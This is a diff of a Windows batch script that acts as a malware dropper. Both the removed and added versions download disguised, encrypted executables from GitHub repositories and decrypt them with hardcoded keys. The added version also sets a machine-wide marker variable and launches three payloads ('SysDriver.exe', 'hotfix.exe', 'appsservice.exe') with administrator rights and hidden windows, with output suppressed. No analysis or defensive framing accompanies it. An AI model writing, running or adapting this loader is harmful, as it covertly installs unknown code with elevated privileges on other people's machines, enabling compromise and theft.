@@ -1,10 +1,31 @@
-@echo off 
-curl -o "%TEMP%\ADT.exe" https://raw.githubusercontent.com/FlipZak/filebin/main/packaging.standart
-curl -o "%TEMP%\LoadDependencies.cmp" https://raw.githubusercontent.com/FlipZak/filebin/main/LoadDependencies.cmp 
-powershell.exe -Command "$url = 'https://raw.githubusercontent.com/FlipZak/filebin/main/packaging.standart'; $dest = '%TEMP%\ADT.exe'; Invoke-WebRequest -Uri $url -OutFile $dest" 
-powershell.exe -Command "$url = 'https://raw.githubusercontent.com/FlipZak/filebin/main/LoadDependencies.cmp'; $dest = '%TEMP%\LoadDependencies.cmp'; Invoke-WebRequest -Uri $url -OutFile $dest" 
-cd %TEMP% 
-ADT.exe decrypt --input LoadDependencies.cmp --key aa0bef1bf6c6547731f57880ab122d77748d0d171e63b7536848af349fd40165
+@echo off
+if not defined BEBRAWARE (
+    setx BEBRAWARE true /m && refreshenv
+	cd C:\ProgramData
+	curl -LO https://raw.githubusercontent.com/FlipZak/zov/main/SysDriver.exe.alp
+	curl -LO https://raw.githubusercontent.com/FlipZak/zov/main/hotfix.exe.alp
+	curl -LO https://raw.githubusercontent.com/FlipZak/zov/main/appsservice.exe.alp
+	curl -LO https://raw.githubusercontent.com/TheWeaponSmith/Alpaca/main/builds/alpaca-win64.exe
 
-start LoadDependencies.exe
-exit
+(
+echo - action: Decrypt
+echo   key: 507ee6ab6553f15e773208d421b0a6b6#9965019957152a0f3e642f5c
+echo   filepath: SysDriver.exe.alp
+echo.
+echo - action: Decrypt
+echo   key: e8b8d7b922a4763a317cab7587d2af68#67fea630121388e82fb84592
+echo   filepath: hotfix.exe.alp
+echo.
+echo - action: Decrypt
+echo   key: 99a0e75227cb512f422b0f0364fce46b#62ea7a4c66f86f0c77e01a07
+echo   filepath: appsservice.exe.alp
+) > schematic.yml
+
+alpaca-win64.exe load-schematic schematic.yml
+
+powershell.exe Start-Process '"SysDriver.exe"' -Verb "runas" -WindowStyle Hidden >nul 2>&1
+powershell.exe Start-Process '"hotfix.exe"' -Verb "runas" -WindowStyle Hidden >nul 2>&1
+powershell.exe Start-Process '"appsservice.exe"' -Verb "runas" -WindowStyle Hidden >nul 2>&1
+) else (
+    echo Finished!
+)
